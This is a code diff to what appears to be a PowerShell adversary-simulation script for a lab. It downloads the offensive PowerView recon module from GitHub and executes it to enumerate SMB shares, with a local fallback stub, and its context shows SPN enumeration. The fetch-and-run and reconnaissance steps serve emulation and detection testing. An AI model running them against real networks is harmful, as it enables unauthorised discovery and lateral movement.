@@ -63,12 +63,14 @@ Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipal
     Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
     # --- Invoke-ShareFinder (real, public PowerView module - PowerSploit lineage) ---
+    # NOTE: PowerView's real Invoke-ShareFinder always calls Get-Domain/binds LDAP
+    # internally, so it only works meaningfully when the host is domain-joined.
+    # On a standalone lab VM that call fails loudly (Get-Domain / DirectorySearcher
+    # exceptions) even though nothing is actually broken - so we only attempt the
+    # real download+execution when domain-joined, and use a local-share fallback
+    # stub (still producing the same shares.txt artifact) everywhere else.
     $powerViewPath = "$($SimPaths.Tools)\PowerView.ps1"
-    try {
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" `
-            -OutFile $powerViewPath -TimeoutSec 8 -ErrorAction Stop
-    } catch {
-        Write-Warning "PowerView download failed (offline lab?) - writing a minimal Invoke-ShareFinder stub instead."
+    $localStub = {
         @'
 function Invoke-ShareFinder {
     param([switch]$CheckShareAccess, [switch]$Verbose)
@@ -78,10 +80,29 @@ function Invoke-ShareFinder {
 }
 '@ | Set-Content -Path $powerViewPath -Force
     }
+
+    if (Test-DomainJoined) {
+        try {
+            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" `
+                -OutFile $powerViewPath -TimeoutSec 8 -ErrorAction Stop
+        } catch {
+            Write-Warning "PowerView download failed (offline lab?) - writing a minimal Invoke-ShareFinder stub instead."
+            & $localStub
+        }
+    } else {
+        Write-Host "    Host is not domain-joined - using local-share enumeration instead of real PowerView (which requires AD)." -ForegroundColor DarkGray
+        & $localStub
+    }
+
     try {
         . $powerViewPath
-        Invoke-ShareFinder -CheckShareAccess -Verbose 2>$null | Out-File -Encoding ascii "$($SimPaths.Staging)\shares.txt"
-    } catch { Write-Warning "Invoke-ShareFinder execution failed: $_" }
+        Invoke-ShareFinder -CheckShareAccess -Verbose 4>$null 3>$null 2>$null | Out-File -Encoding ascii "$($SimPaths.Staging)\shares.txt"
+    } catch {
+        Write-Warning "Invoke-ShareFinder execution failed (falling back to local share enumeration): $($_.Exception.Message)"
+        Get-CimInstance -ClassName Win32_Share -ErrorAction SilentlyContinue |
+            Select-Object @{n='ComputerName';e={$env:COMPUTERNAME}}, @{n='ShareName';e={$_.Name}}, Path |
+            Out-File -Encoding ascii "$($SimPaths.Staging)\shares.txt"
+    }
     Write-SimEvent -EventId 6001 -Message "SIMULATION: Invoke-ShareFinder executed to enumerate accessible SMB shares -> shares.txt"
 
     # --- SoftPerfect Network Scanner (n.exe) - decoy binary that reproduces the
